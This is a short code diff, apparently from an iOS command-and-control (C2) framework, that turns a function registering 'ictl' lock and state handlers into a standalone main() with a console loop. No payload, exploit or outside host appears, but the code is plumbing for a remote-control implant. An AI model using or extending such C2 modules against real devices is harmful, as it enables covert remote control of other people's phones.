@@ -27,8 +27,10 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 
-#include "c2.h"
-#include "tlv.h"
+#include <c2.h>
+#include <tlv.h>
+#include <tab.h>
+#include <console.h>
 
 static NSString *ictl_talk_reply(NSMutableArray *args)
 {
@@ -49,8 +51,15 @@ static c2_api_call_t *ictl_state(tlv_transport_pkt_t tlv_transport_packet)
     return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, [result UTF8String]);
 }
 
-void register_ictl_api_calls(c2_api_calls_t **c2_api_calls_table)
+int main(void)
 {
-    c2_register_api_call(c2_api_calls_table, 1, ictl_lock, ICTL_SCOPE);
-    c2_register_api_call(c2_api_calls_table, 2, ictl_state, ICTL_SCOPE);
+    c2_api_calls_t *c2_api_calls_table = NULL;
+
+    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL, ictl_lock, ICTL_SCOPE);
+    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL + 1, ictl_state, ICTL_SCOPE);
+
+    tab_console_loop(c2_api_calls_table);
+    c2_api_calls_free(c2_api_calls_table);
+
+    return 0;
 }
